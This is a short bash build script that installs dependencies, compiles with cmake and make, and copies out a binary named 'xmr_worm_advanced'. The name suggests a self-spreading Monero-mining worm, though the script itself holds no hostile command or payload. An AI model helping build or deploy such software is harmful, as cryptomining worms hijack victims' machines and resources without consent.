#!/bin/bash

echo "[*] Building XMR-WORM-ADVANCED..."

# Install dependencies
./scripts/install_deps.sh

# Build
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)

# Copy binary
cp xmr_worm_advanced ../

cd ..
echo "[*] Build complete. Binary: ./xmr_worm_advanced"
ls -lh xmr_worm_advanced
